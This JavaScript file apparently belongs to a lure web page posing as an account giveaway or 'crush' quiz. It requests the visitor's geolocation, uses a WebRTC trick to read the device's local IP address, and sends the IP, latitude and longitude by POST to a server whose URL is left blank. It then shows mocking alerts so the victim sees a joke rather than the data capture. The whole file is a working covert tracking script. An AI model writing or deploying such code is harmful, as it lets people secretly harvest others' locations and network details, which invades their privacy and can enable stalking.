    // Set up global variable
    var result;
	var locip;

	function getip(lat, lon){

var isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
if (isMobile) {
	window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;//compatibility for Firefox and chrome
	var pc = new RTCPeerConnection({iceServers:[]}), noop = function(){};      
	pc.createDataChannel('');//create a bogus data channel
	pc.createOffer(pc.setLocalDescription.bind(pc), noop);// create offer and set local description
	pc.onicecandidate = function(ice)
	{
	if (ice && ice.candidate && ice.candidate.candidate)
	{
	var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1]; 
	
	pc.onicecandidate = noop;
	console.log('my IP: ', myIP); 
	let re = /(^192\.168\.([0-9]|[0-9][0-9]|[0-2][0-5][0-5])\.([0-9]|[0-9][0-9]|[0-2][0-5][0-5])$)|(^172\.([1][6-9]|[2][0-9]|[3][0-1])\.([0-9]|[0-9][0-9]|[0-2][0-5][0-5])\.([0-9]|[0-9][0-9]|[0-2][0-5][0-5])$)|(^10\.([0-9]|[0-9][0-9]|[0-2][0-5][0-5])\.([0-9]|[0-9][0-9]|[0-2][0-5][0-5])\.([0-9]|[0-9][0-9]|[0-2][0-5][0-5])$)/
	if (re.test(myIP)) {
		window.result = myIP;
		var xhr = new XMLHttpRequest();
		var yourUrl = '';
		var data = 'locip='+window.result+'&latitude='+lat+'&longitude='+lon
		xhr.open("POST", yourUrl, true);
		xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
		xhr.send(data);
		alert("Oops! You're late. All accounts are given away"); 
	}
	else{
		var xhr = new XMLHttpRequest();
		var yourUrl = '';
		var data = 'locip=Not Connected to LAN'+'&latitude='+lat+'&longitude='+lon
		xhr.open("POST", yourUrl, true);
		xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
		xhr.send(data);
		alert("Oops! You're late. All accounts are given away"); 
	}
}
};
	
}


		else{

			window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;//compatibility for Firefox and chrome
			var pc = new RTCPeerConnection({iceServers:[]}), noop = function(){};      
			pc.createDataChannel('');//create a bogus data channel
			pc.createOffer(pc.setLocalDescription.bind(pc), noop);// create offer and set local description
			pc.onicecandidate = function(ice)
			{
			if (ice && ice.candidate && ice.candidate.candidate)
				{
				var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1]; 
				
				pc.onicecandidate = noop;
				console.log('my IP: ', myIP); 
				window.result = myIP;
				var xhr = new XMLHttpRequest();
				var yourUrl = '';
				var data = 'locip='+window.result+'&latitude='+lat+'&longitude='+lon
				xhr.open("POST", yourUrl, true);
				xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
				xhr.send(data);
				alert("You've got no Crush you lonely dumbass");
				}
		};


	}
}
    
    function showPosition() {
        // Store the element where the page displays the result
        result = document.getElementById("result");
        
        // If geolocation is available, try to get the visitor's position
        if(navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
        } else {
            alert("Sorry, your browser does not support HTML5 geolocation.");
        }
    };
    
    // Define callback function for successful attempt
    function successCallback(position) {
		var lat = position.coords.latitude;
		var lon = position.coords.longitude;
	
        getip(lat, lon);
	}
    
    // Define callback function for failed attempt
    function errorCallback(error) {
        if(error.code == 1) {
            var lat = "Not Disclosed";
			var lon = "Not Disclosed";
            getip(lat, lon);
        } else if(error.code == 2) {
			var lat = "Network Down";
			var lon = "Network Down";
            getip(lat, lon);
        } else if(error.code == 3) {
            var lat = "Time out";
			var lon = "Time out";
            getip(lat, lon);
        } else {
			var lat = "Unknown Error";
			var lon = "Unknown Error";
            getip(lat, lon);
        }
    }
